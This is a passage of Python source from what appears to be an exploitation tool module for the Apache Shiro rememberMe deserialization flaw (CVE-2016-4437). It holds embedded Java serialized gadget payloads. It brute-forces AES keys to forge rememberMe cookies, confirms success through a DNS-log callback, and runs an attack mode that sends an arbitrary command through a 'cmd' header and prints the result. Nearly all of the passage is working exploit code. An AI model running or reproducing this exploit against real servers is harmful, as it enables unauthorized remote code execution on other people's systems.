                            r"/wBjAAwHAAIHAAQHAAQHAFwBBwBvAQcAYQAHAIkBBwAEAAAC+wBULgL7AE1RBwDlKQsEAg" \
                            r"wH/wAFAAsHAAIHAAQABwBcAQcAbwEHAGEABwCJAQAA/wAHAAgHAAIAAAABBwBvAQcAYQAA" \
                            r"+gAFAD0AAAAEAAEAPwABAAUAAAACAAZwdAADYWJjc3IAFGphdmEudXRpbC5Qcm9wZXJ0aW" \
                            r"VzORLQenA2PpgCAAFMAAhkZWZhdWx0c3EAfgALeHIAE2phdmEudXRpbC5IYXNodGFibGUT" \
                            r"uw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAA" \
                            r"AAAHhwdwEAeHNyACtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0Lm1hcC5MYXp5" \
                            r"TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAtTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZW" \
                            r"N0aW9uczQvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp" \
                            r"b25zNC5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdA" \
                            r"ATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AApbAAtpUGFyYW1UeXBl" \
                            r"c3EAfgAJeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObm" \
                            r"V3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABz" \
                            r"cQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAAXR4"
        
        try:
            #_verify
            if self.vuln == 'False':
                dnslog = Dnslog()
                url0 = dnslog.dns_host()
                url1 = 'http://' + url0
                payload = 'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff740010{0}74000071007e0005740004687474707078740017{1}78'.format(binascii.hexlify(url0.encode()).decode(),binascii.hexlify(url1.encode()).decode())
                payload = binascii.a2b_hex(payload)
                BS = AES.block_size
                pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                mode = AES.MODE_CBC
                iv = uuid.uuid4().bytes
                for key in key_lists:
                    encryptor = AES.new(base64.b64decode(key), mode, iv)
                    file_body = pad(payload)
                    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()

                    exprequest.get(self.url+path, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext})
                    if dnslog.result():
                        info = "[rce]" + " [key: " + key + " ] [gadget: " + "URLDNS" + " ]"
                        output.no_echo_success(method, info)

                        for gadget in gadget_lists:
                            for echo in echo_lists:
                                gadget_payload = ysoserial_payload(gadget,"directive:"+echo)
                                BS = AES.block_size
                                pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                                mode =  AES.MODE_CBC
                                iv = uuid.uuid4().bytes
                                encryptor = AES.new(base64.b64decode(key), mode, iv)
                                file_body = pad(gadget_payload)
                                base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()

                                win_text = exprequest.get(self.url+path, headers={'cmd': self.win_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
                                linux_text = exprequest.get(self.url+path, headers={'cmd': self.linux_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
                                if "VuLnEcHoPoCSuCCeSS" in win_text or "VuLnEcHoPoCSuCCeSS" in linux_text:
                                    GlobalVar.set_value('key', key)
                                    GlobalVar.set_value('gadget', gadget)
                                    GlobalVar.set_value('echo', echo)
                                    info = "[rce]" + " [key: " + key + " ] [gadget: " + gadget + " ] [echo: "+ echo + " ]"
                                    output.echo_success(method, info)
                                    self.status = 'success'
                                    break
                            else:
                                continue
                            break
                        break
                    else:
                      output.result_error('%s is incorrect'%key)
            #_attack
            else:
                #指定攻击参数
                key = GlobalVar.get_value('key')
                gadget = GlobalVar.get_value('gadget')
                echo = GlobalVar.get_value('echo')
                gadget_payload = ysoserial_payload(gadget,"directive:" + echo)
                BS = AES.block_size
                pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                mode =  AES.MODE_CBC
                iv = uuid.uuid4().bytes
                encryptor = AES.new(base64.b64decode(key), mode, iv)
                file_body = pad(gadget_payload)
                base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()

                text = exprequest.get(self.url+path, headers={'cmd': self.cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
                #print(text)
                if '<!DOCTYPE' in text:
                    result = text[:text.find('<!DOCTYPE')].strip()
                    print(result)
                else:
                    print(text)
                    #output.fail()
        except Exception as error:
            output.error_output(str(error))

print("""
+-------------------+------------------+------+--------+-------------------------------------------------------------+
| AppName           | Pocname          | Path | Method | Impact Version && Vulnerability description                 |
+-------------------+------------------+------+--------+-------------------------------------------------------------+
| Apache Shiro      | cve_2016_4437    |  /   |  post  | <= 1.2.4, shiro-550, rememberme deserialization rce         |
+-------------------+------------------+------+--------+-------------------------------------------------------------+""")

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpApacheShiro = ApacheShiro(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpApacheShiro, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpApacheShiro.status
    else:#调用所有函数
        for func in dir(ApacheShiro):
            if not func.startswith("__"):
                methodcaller(func)(ExpApacheShiro)
                result_list.append(func+' -> '+ExpApacheShiro.status)
                ExpApacheShiro.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)










































































































































































































